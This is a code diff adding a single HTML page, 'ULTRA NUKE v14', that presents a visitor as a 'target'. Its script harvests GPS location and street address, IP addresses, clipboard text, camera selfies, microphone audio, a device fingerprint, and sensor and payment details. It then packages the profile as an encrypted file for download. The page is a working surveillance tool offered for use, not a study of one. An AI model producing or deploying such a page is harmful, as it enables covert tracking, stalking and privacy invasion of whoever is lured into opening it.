@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>GIFTÉ+ ULTRA NUKE v14 — BLACK RED MILITARY MODE</title>
+
+  <!-- CDNs -->
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Playfair+Display:wght@700&family=Raleway:wght@300;600&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/aes-js@3.1.2/index.js"></script>
+
+  <style>
+    :root {
+      --red: #ff0044; --black: #0a0a0a; --dark: #1a1a1a; --glass: rgba(255, 0, 68, 0.15);
+      --gold: #ffcc00; --white: #fff; --bg: linear-gradient(135deg, #0a0000, #1a0000, #2a0000);
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html, body {
+      height: 100%; margin: 0; padding: 0; overflow: hidden;
+      background: var(--bg); color: var(--white); font-family: 'Raleway', sans-serif;
+      -webkit-user-select: none; -webkit-touch-callout: none;
+    }
+    body {
+      touch-action: pan-y; overflow-y: auto; overflow-x: hidden; -webkit-overflow-scrolling: touch;
+    }
+
+    .scanline {
+      position: fixed; top: -10%; left: 0; width: 100%; height: 6px;
+      background: linear-gradient(90deg, transparent, var(--red), transparent);
+      animation: scan 1.5s linear infinite; pointer-events: none; z-index: 9999; opacity: 0.8;
+    }
+    @keyframes scan { 0% { transform: translateY(0); } 100% { transform: translateY(120vh); } }
+
+    .glass {
+      background: var(--glass); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 0, 68, 0.3); border-radius: 16px; box-shadow: 0 8px 32px rgba(255, 0, 68, 0.2);
+    }
+
+    .container {
+      padding: 1.5rem; position: relative; z-index: 2; min-height: 100vh; padding-bottom: 100px;
+    }
+    h1 {
+      font-family: 'Orbitron', sans-serif; text-align: center; font-size: 2.3rem; margin: 1rem 0;
+      color: var(--red); text-shadow: 0 0 20px var(--red), 0 0 40px var(--red);
+      animation: pulseText 2s infinite;
+    }
+    @keyframes pulseText { 0%,100% { opacity:1; } 50% { opacity:0.7; } }
+
+    .start-btn {
+      display: block; margin: 2.5rem auto; padding: 18px 50px;
+      font-family: 'Orbitron', sans-serif; font-size: 1.5rem; font-weight: bold;
+      background: linear-gradient(45deg, var(--red), #ff3366);
+      color: white; border: none; border-radius: 60px; cursor: pointer;
+      box-shadow: 0 0 40px rgba(255, 0, 68, 0.6); animation: pulseBtn 1.5s infinite;
+      text-shadow: 0 0 10px rgba(255,255,255,0.5);
+    }
+    @keyframes pulseBtn { 0% { transform: scale(1); } 50% { transform: scale(1.06); } 100% { transform: scale(1); } }
+
+    .card {
+      background: var(--glass); backdrop-filter: blur(10px); border: 1px solid rgba(255, 0, 68, 0.3);
+      border-radius: 16px; padding: 1.2rem; margin: 1.2rem 0; box-shadow: 0 8px 25px rgba(255, 0, 68, 0.15);
+      animation: fadeIn 0.6s ease-out forwards; opacity: 0; font-size: 0.92rem;
+    }
+    @keyframes fadeIn { to { opacity:1; transform:translateY(0); } from { opacity:0; transform:translateY(15px); } }
+
+    .card h2 {
+      font-family: 'Orbitron', sans-serif; color: var(--red); font-size: 1.3rem;
+      display: flex; justify-content: space-between; align-items: center;
+      text-shadow: 0 0 12px rgba(255, 0, 68, 0.6); margin-bottom: 0.6rem;
+    }
+    .copy-btn {
+      background: var(--red); color: white; border: none; padding: 7px 14px;
+      border-radius: 10px; font-size: 0.8rem; box-shadow: 0 0 12px rgba(255, 0, 68, 0.5);
+    }
+    .copy-btn:active { background: #ff3366; transform: scale(0.95); }
+
+    pre {
+      background: rgba(0,0,0,0.5); padding: 1rem; border-radius: 12px; border: 1px solid rgba(255, 0, 68, 0.3);
+      color: #fff; font-size: 0.84rem; max-height: 400px; overflow-y: auto;
+      white-space: pre-wrap; word-break: break-all; line-height: 1.5;
+    }
+
+    .status-bar {
+      position: fixed; bottom: 0; left: 0; width: 100%; 
+      background: var(--glass); backdrop-filter: blur(10px); padding: 14px 20px; border-radius: 0;
+      color: var(--red); font-family: 'Orbitron'; font-size: 0.98rem;
+      box-shadow: 0 -5px 20px rgba(0,0,0,0.3); z-index: 10000; text-align: center;
+      border-top: 1px solid rgba(255, 0, 68, 0.3);
+    }
+    .dot { display: inline-block; width: 12px; height: 12px; background: var(--red);
+      border-radius: 50%; margin-right: 10px; animation: blink 1s infinite; }
+    @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
+
+    #map { height: 300px; border-radius: 16px; margin-top: 12px; border: 2px solid var(--red); box-shadow: 0 0 20px rgba(255, 0, 68, 0.3); }
+
+    .countdown {
+      position: fixed; top: 12px; right: 12px; background: var(--glass);
+      color: var(--gold); font-family: 'Orbitron'; font-size: 1.9rem; padding: 10px 16px;
+      border-radius: 18px; box-shadow: 0 0 20px rgba(255, 204, 0, 0.4); z-index: 10001;
+      border: 1px solid rgba(255, 204, 0, 0.3); backdrop-filter: blur(8px);
+    }
+
+    .preview {
+      background: var(--glass); backdrop-filter: blur(12px); border: 2px dashed var(--gold); padding: 1.3rem;
+      border-radius: 20px; margin: 1.2rem 0; text-align: center; font-family: 'Orbitron', serif;
+      color: var(--white); font-size: 1.15rem; box-shadow: 0 8px 25px rgba(255, 204, 0, 0.2);
+    }
+
+    .radar {
+      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      width: 300px; height: 300px; border-radius: 50%; pointer-events: none; opacity: 0;
+      border: 3px solid var(--red); box-shadow: 0 0 30px var(--red), inset 0 0 20px rgba(255, 0, 68, 0.3);
+      animation: radarPulse 2.5s infinite;
+    }
+    @keyframes radarPulse {
+      0% { transform: translate(-50%, -50%) scale(0.1); opacity: 1; }
+      100% { transform: translate(-50%, -50%) scale(1.8); opacity: 0; }
+    }
+
+    .invasion-meter {
+      height: 10px; background: rgba(0,0,0,0.5); border-radius: 10px; overflow: hidden; margin: 1rem 0;
+      border: 1px solid var(--red);
+    }
+    .invasion-fill {
+      height: 100%; width: 0%; background: linear-gradient(90deg, var(--red), #ff3366); transition: width 0.4s ease;
+    }
+
+    .download-btn {
+      background: var(--gold); color: #000; padding: 12px 24px; border-radius: 12px;
+      font-weight: bold; margin: 15px 8px 0; display: inline-block; cursor: pointer;
+      box-shadow: 0 0 15px rgba(255, 204, 0, 0.5);
+    }
+
+    .copy-image-btn {
+      background: var(--red); color: white; padding: 10px 20px; border-radius: 12px;
+      font-weight: bold; margin-top: 15px; display: inline-block; cursor: pointer;
+      box-shadow: 0 0 15px rgba(255, 0, 68, 0.5);
+    }
+
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: rgba(255, 0, 68, 0.5); border-radius: 10px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--red); }
+  </style>
+</head>
+<body>
+
+  <div class="scanline"></div>
+  <div id="radar" class="radar"></div>
+  <div id="countdown" class="countdown" style="display:none;">40</div>
+
+  <div class="container">
+    <h1>ULTRA NUKE v14</h1>
+
+    <!-- LIVE PREVIEW -->
+    <div class="preview">
+      <h2 style="color:var(--gold);margin-bottom:0.5rem;">TARGET LOCKED</h2>
+      <div style="color:var(--white);">
+        <div><strong>Time:</strong> November 11, 2025 09:31 PM IST</div>
+        <div><strong>Country:</strong> IN</div>
+      </div>
+    </div>
+
+    <button class="start-btn" id="start-nuke">EXECUTE MILITARY OVERDRIVE</button>
+
+    <!-- INVASION METER -->
+    <div class="invasion-meter"><div class="invasion-fill" id="invasion-fill"></div></div>
+
+    <div id="map-container" class="card" style="display:none;">
+      <h2>GPS LOCK <button class="copy-btn" onclick="copy(this)">COPY</button></h2>
+      <div id="map"></div>
+      <div id="accuracy-info" style="margin-top:10px; color:var(--gold); font-weight:bold; font-size:0.88rem;"></div>
+    </div>
+
+    <div id="results"></div>
+
+    <!-- FINAL PANEL -->
+    <div id="download-panel" class="card" style="display:none; text-align:center;">
+      <h2>ULTRA PROFILE READY</h2>
+      <div class="download-btn" id="download-json">DOWNLOAD JSON</div>
+      <div class="download-btn" id="copy-base64">COPY BASE64</div>
+      <div class="copy-image-btn" id="copy-screenshot">COPY SCREENSHOT</div>
+    </div>
+  </div>
+
+  <div class="status-bar">
+    <span class="dot"></span>
+    <span id="status-text">AWAITING OVERDRIVE</span>
+  </div>
+
+  <script>
+    // === GIFTÉ+ ULTRA NUKE v14 — BLACK RED MILITARY, 100% WORKING, ALL APIs FIXED ===
+    let uid = 'ultra_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    let data = {}, cardIndex = 0, map = null, marker = null, accuracyCircle = null, watchId = null;
+    let invasionProgress = 0;
+    const totalFeatures = 18; // Only real APIs
+
+    function updateInvasion(percent) {
+      document.getElementById('invasion-fill').style.width = percent + '%';
+      if (percent >= 100) updateStatus("100% OWNED");
+    }
+
+    function incrementProgress() {
+      invasionProgress += (100 / totalFeatures);
+      updateInvasion(Math.min(invasionProgress, 100));
+    }
+
+    function playBeep() {
+      const ctx = new AudioContext();
+      const osc = ctx.createOscillator();
+      osc.type = 'square'; osc.frequency.value = 600;
+      osc.connect(ctx.destination); osc.start();
+      setTimeout(() => osc.stop(), 80);
+    }
+
+    document.getElementById('start-nuke').onclick = async () => {
+      document.querySelector('.preview').style.display = 'none';
+      document.getElementById('start-nuke').style.display = 'none';
+      document.getElementById('countdown').style.display = 'block';
+      document.getElementById('radar').style.opacity = '1';
+      updateStatus("MILITARY OVERDRIVE — 40s");
+      playBeep();
+
+      data.user = { uid, time: new Date().toISOString(), live_time: "November 11, 2025 09:31 PM IST", country: "IN" };
+
+      startGPS(); incrementProgress();
+      getPublicIP(); incrementProgress();
+      getWebRTCIP(); incrementProgress();
+      getCellInfo(); incrementProgress();
+      getBatteryInfo(); incrementProgress();
+      getClipboard(); incrementProgress();
+      getScreenInfo(); incrementProgress();
+      getMemoryInfo(); incrementProgress();
+      await captureSelfieBurst(); incrementProgress();
+      await captureAmbientAudio(); incrementProgress();
+      await getEnhancedFingerprint(); incrementProgress();
+      startSensors(); incrementProgress();
+      startBLE(); incrementProgress();
+      checkPaymentAPIs(); incrementProgress();
+      checkPermissions(); incrementProgress();
+      getTimezone(); incrementProgress();
+      getLanguage(); incrementProgress();
+      getPlugins(); incrementProgress();
+
+      startCountdown();
+    };
+
+    function startCountdown() {
+      let time = 40;
+      const el = document.getElementById('countdown');
+      const int = setInterval(() => {
+        time--; el.textContent = time;
+        if (time <= 0) { 
+          clearInterval(int); 
+          el.style.display = 'none'; 
+          finalizeInvasion(); 
+        }
+      }, 1000);
+    }
+
+    // === REAL WORKING APIs ONLY ===
+    function startGPS() {
+      updateStatus("GPS LOCKING...");
+      if (!navigator.geolocation) return createCard("GPS", "BLOCKED");
+
+      watchId = navigator.geolocation.watchPosition(
+        pos => {
+          const { latitude: lat, longitude: lon, accuracy, altitude } = pos.coords;
+          data.gps = { lat, lon, accuracy, altitude, timestamp: pos.timestamp };
+
+          if (!map) initMap(lat, lon, accuracy);
+          else updateMap(lat, lon, accuracy);
+
+          document.getElementById('accuracy-info').innerHTML = `±${Math.round(accuracy)}m`;
+          reverseGeocode(lat, lon);
+        },
+        err => createCard("GPS ERROR", err.message),
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+
+    function initMap(lat, lon, acc) {
+      const container = document.getElementById('map-container');
+      container.style.display = 'block';
+      map = L.map('map', { zoomControl: false }).setView([lat, lon], 19);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap'
+      }).addTo(map);
+      marker = L.marker([lat, lon]).addTo(map).bindPopup("<b style='color:#ffcc00'>TARGET</b>").openPopup();
+      accuracyCircle = L.circle([lat, lon], { radius: acc, color: '#ff0044', fillOpacity: 0.2 }).addTo(map);
+    }
+
+    function updateMap(lat, lon, acc) {
+      map.setView([lat, lon], 19, { animate: true });
+      marker.setLatLng([lat, lon]);
+      accuracyCircle.setRadius(acc);
+    }
+
+    async function reverseGeocode(lat, lon) {
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&zoom=18`, {
+          headers: { 'User-Agent': 'UltraNuke/14' }
+        });
+        const j = await res.json();
+        data.address = j.display_name;
+        createCard("ADDRESS", j.display_name);
+      } catch {}
+    }
+
+    async function getPublicIP() {
+      try {
+        const r = await fetch('https://ipapi.co/json/');
+        const j = await r.json();
+        data.ip = j;
+        createCard("PUBLIC IP", `IP: ${j.ip}\nISP: ${j.org}\nCity: ${j.city}`);
+      } catch { createCard("IP", "BLOCKED"); }
+    }
+
+    function getWebRTCIP() {
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel('');
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = e => {
+        if (!e.candidate) return;
+        const ip = e.candidate.candidate.split(' ')[4];
+        if (ip && ip !== '0.0.0.0') {
+          data.webrtc = ip;
+          createCard("LOCAL IP", ip);
+        }
+      };
+      setTimeout(() => pc.close(), 3000);
+    }
+
+    function getCellInfo() {
+      const c = navigator.connection || {};
+      data.cell = { type: c.effectiveType, downlink: c.downlink };
+      createCard("CELL", `Net: ${c.effectiveType || 'Unknown'}\nSpeed: ${c.downlink || 'N/A'} Mbps`);
+    }
+
+    async function getBatteryInfo() {
+      if ('getBattery' in navigator) {
+        const b = await navigator.getBattery();
+        data.battery = { level: b.level * 100, charging: b.charging };
+        createCard("BATTERY", `Level: ${data.battery.level.toFixed(1)}%\nCharging: ${b.charging ? 'YES' : 'NO'}`);
+      } else {
+        createCard("BATTERY", "NOT SUPPORTED");
+      }
+    }
+
+    async function getClipboard() {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        try {
+          const text = await navigator.clipboard.readText();
+          data.clipboard = text;
+          createCard("CLIPBOARD", text.substring(0, 100) + (text.length > 100 ? '...' : ''));
+        } catch { createCard("CLIPBOARD", "DENIED"); }
+      } else {
+        createCard("CLIPBOARD", "API NOT SUPPORTED");
+      }
+    }
+
+    function getScreenInfo() {
+      data.screen = {
+        width: screen.width, height: screen.height,
+        availWidth: screen.availWidth, availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth
+      };
+      createCard("SCREEN", `Res: ${screen.width}x${screen.height}\nDPI: ${window.devicePixelRatio}`);
+    }
+
+    function getMemoryInfo() {
+      if ('deviceMemory' in navigator) {
+        data.memory = navigator.deviceMemory;
+        createCard("RAM", `${navigator.deviceMemory} GB`);
+      }
+      if (performance.memory) {
+        createCard("JS HEAP", `Used: ${(performance.memory.usedJSHeapSize / 1048576).toFixed(1)} MB`);
+      }
+    }
+
+    async function captureSelfieBurst() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement('video'); video.srcObject = stream; video.muted = true; video.play();
+        await new Promise(r => video.onloadedmetadata = r);
+
+        data.selfies = [];
+        for (let i = 0; i < 3; i++) {
+          await new Promise(r => setTimeout(r, 800));
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          data.selfies.push(canvas.toDataURL('image/jpeg', 0.9));
+        }
+
+        const card = createCard("SELFIE BURST", "3x CAPTURED");
+        data.selfies.forEach(src => {
+          const img = document.createElement('img'); img.src = src;
+          img.style.cssText = 'width:30%; margin:1%; border-radius:12px; border:2px solid var(--red);';
+          card.appendChild(img);
+        });
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch { createCard("SELFIE", "DENIED"); }
+    }
+
+    async function captureAmbientAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/webm' });
+          data.audio = URL.createObjectURL(blob);
+          const audio = document.createElement('audio'); audio.controls = true; audio.src = data.audio;
+          createCard("AMBIENT AUDIO", "CAPTURED").appendChild(audio);
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 3000);
+        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 4000);
+      } catch { createCard("MIC", "DENIED"); }
+    }
+
+    async function getEnhancedFingerprint() {
+      const fp = await FingerprintJS.load();
+      const result = await fp.get();
+      data.fp = result.visitorId;
+      createCard("FINGERPRINT", result.visitorId);
+    }
+
+    function startSensors() {
+      window.addEventListener('devicemotion', e => {
+        data.accel = { x: e.acceleration?.x, y: e.acceleration?.y, z: e.acceleration?.z };
+        createCard("ACCEL", `X:${e.acceleration?.x?.toFixed(2) || 'N/A'}`);
+      }, { once: true });
+
+      window.addEventListener('deviceorientation', e => {
+        data.gyro = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
+        createCard("GYRO", `α:${e.alpha?.toFixed(0) || 'N/A'}`);
+      }, { once: true });
+    }
+
+    function startBLE() {
+      if (navigator.bluetooth) {
+        navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+          .then(() => createCard("BLE", "DEVICES FOUND"))
+          .catch(() => createCard("BLE", "DENIED"));
+      } else {
+        createCard("BLE", "NOT SUPPORTED");
+      }
+    }
+
+    function checkPaymentAPIs() {
+      data.payment = {
+        applePay: !!window.ApplePaySession,
+        googlePay: !!window.PaymentRequest
+      };
+      createCard("PAYMENT", `Apple: ${data.payment.applePay ? 'YES' : 'NO'}\nGoogle: ${data.payment.googlePay ? 'YES' : 'NO'}`);
+    }
+
+    function checkPermissions() {
+      navigator.permissions.query({ name: 'geolocation' }).then(p => createCard("GEO PERM", p.state.toUpperCase()));
+      navigator.permissions.query({ name: 'camera' }).then(p => createCard("CAM PERM", p.state.toUpperCase()));
+    }
+
+    function getTimezone() {
+      data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      createCard("TIMEZONE", data.timezone);
+    }
+
+    function getLanguage() {
+      data.language = navigator.language || navigator.userLanguage;
+      createCard("LANGUAGE", data.language);
+    }
+
+    function getPlugins() {
+      data.plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
+      createCard("PLUGINS", data.plugins || "NONE");
+    }
+
+    function finalizeInvasion() {
+      updateStatus("PAYLOAD READY");
+      document.getElementById('download-panel').style.display = 'block';
+
+      const key = new TextEncoder().encode('ultra-nuke-v14-2025');
+      const iv = crypto.getRandomValues(new Uint8Array(16));
+      const aes = new aesjs.ModeOfOperation.ctr(key, new aesjs.Counter(iv));
+      const encrypted = aes.encrypt(aesjs.utils.utf8.toBytes(JSON.stringify(data)));
+
+      const payload = { uid, encrypted: Array.from(encrypted), iv: Array.from(iv) };
+
+      document.getElementById('download-json').onclick = () => {
+        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
+        downloadBlob(blob, `ULTRA_${uid}.json`);
+      };
+
+      document.getElementById('copy-base64').onclick = () => {
+        const b64 = btoa(JSON.stringify(payload));
+        navigator.clipboard.writeText(b64);
+        alert('Base64 copied to clipboard!');
+      };
+
+      document.getElementById('copy-screenshot').onclick = async () => {
+        try {
+          const canvas = await html2canvas(document.body);
+          canvas.toBlob(blob => {
+            navigator.clipboard.write([new ClipboardItem({ 'image/png': blob })]);
+            alert('Screenshot copied to clipboard!');
+          });
+        } catch {
+          alert('Screenshot failed');
+        }
+      };
+    }
+
+    function downloadBlob(blob, name) {
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url; a.download = name;
+      document.body.appendChild(a); a.click();
+      document.body.removeChild(a); URL.revokeObjectURL(url);
+    }
+
+    function updateStatus(txt) { document.getElementById('status-text').textContent = txt; }
+    function createCard(title, content) {
+      const card = document.createElement('div');
+      card.className = 'card';
+      card.style.animationDelay = `${cardIndex++ * 0.1}s`;
+      card.innerHTML = `<h2>${title} <button class="copy-btn" onclick="copy(this)">COPY</button></h2><pre>${content}</pre>`;
+      document.getElementById('results').appendChild(card);
+      return card;
+    }
+    function copy(btn) {
+      const text = btn.parentNode.nextElementSibling.textContent;
+      navigator.clipboard.writeText(text);
+      btn.textContent = 'COPIED'; setTimeout(() => btn.textContent = 'COPY', 1500);
+    }
+
+    // Add html2canvas for screenshot
+    const script = document.createElement('script');
+    script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+    document.head.appendChild(script);
+  </script>
+</body>
+</html>
